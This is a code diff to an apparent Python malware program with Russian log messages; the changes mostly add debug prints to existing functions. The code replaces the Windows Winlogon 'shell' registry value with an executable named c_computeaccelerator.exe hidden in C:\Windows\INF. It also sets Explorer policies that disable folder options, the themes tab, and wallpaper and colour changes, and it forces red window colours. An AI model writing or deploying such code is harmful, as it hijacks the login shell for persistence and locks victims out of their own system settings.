@@ -86,15 +86,26 @@ def change_shell_aftervideo():
             print(f"Ошибка при установке значения реестра: {e}")
     threading.Thread(target=worker, daemon=True).start()
 
+
 def change_shell():
     def worker():
+        print("[START] Изменение shell запущено")
         try:
-            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
-            reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe")
+            print("[INFO] Открытие ключа реестра Winlogon...")
+            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+            print("[OK] Ключ открыт")
+            value = r"C:\Windows\INF\c_computeaccelerator.exe"
+            print(f"[INFO] Установка значения shell: {value}")
+            reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
+            print("[SUCCESS] Значение 'shell' успешно изменено")
             reg.CloseKey(key)
+            print("[INFO] Ключ закрыт")
         except Exception as e:
-            print(f"Ошибка при установке значения реестра: {e}")
+            print(f"[ERROR] Ошибка при изменении shell: {e}")
+        finally:
+            print("[END] Работа потока изменения shell завершена")
     threading.Thread(target=worker, daemon=True).start()
+
 
 def update_icons():
     def worker():
@@ -205,17 +216,21 @@ def MinusRegedit():
 def configure_system_settings_after_50():
     def worker():
         def apply_registry_settings(path, settings, hive=reg.HKEY_CURRENT_USER):
+            print(f"[INFO] Применение настроек реестра к пути: {path}")
             try:
                 try:
                     key = reg.OpenKey(hive, path, 0, reg.KEY_SET_VALUE)
+                    print(f"[INFO] Ключ уже существует: {path}")
                 except FileNotFoundError:
                     key = reg.CreateKey(hive, path)
+                    print(f"[INFO] Ключ создан: {path}")
                 for name, value, type_ in settings:
                     reg.SetValueEx(key, name, 0, type_, value)
+                    print(f"[OK] Установлено: {name} = {value} (тип: {type_})")
                 reg.CloseKey(key)
             except Exception as e:
-                print(f"Ошибка в {path}: {e}")
-
+                print(f"[ERROR] Ошибка при установке параметров в {path}: {e}")
+        print("[START] Конфигурация системных настроек начата")
         explorer_settings = [
             (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", [
                 ("NoFolderOptions", 1, reg.REG_DWORD),
@@ -229,6 +244,7 @@ def configure_system_settings_after_50():
         for path, settings in explorer_settings:
             apply_registry_settings(path, settings)
 
+        print("[INFO] Применение цветовой схемы DWM")
         accent_color = 0x0000FF
         dwm_settings = [
             ("AccentColor", accent_color, reg.REG_DWORD),
@@ -237,17 +253,24 @@ def configure_system_settings_after_50():
             ("ColorizationTransparency", 50, reg.REG_DWORD)
         ]
         apply_registry_settings(r"Software\Microsoft\Windows\DWM", dwm_settings)
+
+        print("[INFO] Изменение цвета окон")
         apply_registry_settings(
             r"Control Panel\Colors",
             [("Window", "255 0 0", reg.REG_SZ)]
         )
+
+        print("[INFO] Применение настроек ActiveDesktop")
         active_desktop_settings = [
             ("NoChangingWallPaper", 1, reg.REG_DWORD),
             ("NoChangingColor", 1, reg.REG_DWORD)
         ]
         apply_registry_settings(r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", active_desktop_settings)
+
+        print("[INFO] Применение дополнительных политик Explorer")
         explorer_policy_settings = [
             ("NoThemesTab", 1, reg.REG_DWORD)
         ]
         apply_registry_settings(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", explorer_policy_settings)
+        print("[FINISH] Все системные настройки успешно применены")
     threading.Thread(target=worker, daemon=True).start()
